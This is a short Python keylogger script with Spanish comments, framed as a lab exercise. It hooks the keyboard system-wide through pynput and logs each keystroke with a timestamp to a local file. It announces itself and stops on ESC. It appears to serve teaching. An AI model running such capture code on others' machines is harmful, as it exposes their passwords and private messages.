import logging
from pynput import keyboard

# Configuración del archivo donde se guardarán las pulsaciones
LOG_FILE = "registro_teclas.txt"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

def al_presionar_tecla(key):
    """
    Esta función actúa como el Callback/Hook.
    Se ejecuta CADA VEZ que el sistema detecta una tecla presionada.
    """
    try:
        # Intenta registrar letras y números
        logging.info(f"Tecla presionada: {key.char}")
    except AttributeError:
        # Captura teclas especiales (Enter, Shift, Espacio, etc.)
        logging.info(f"Tecla especial: {key}")

def al_soltar_tecla(key):
    """
    Permite definir una condición de parada para el laboratorio.
    """
    if key == keyboard.Key.esc:
        print("\n[+] Deteniendo el hook de teclado...")
        return False  # Al retornar False, el Listener se detiene

# Inicio del Hook de escucha a nivel de sistema
print(f"[+] Laboratorio activo. Guardando en '{LOG_FILE}'...")
print("[+] Presiona la tecla 'ESC' para terminar.\n")

with keyboard.Listener(
    on_press=al_presionar_tecla,
    on_release=al_soltar_tecla
) as listener:
    listener.join()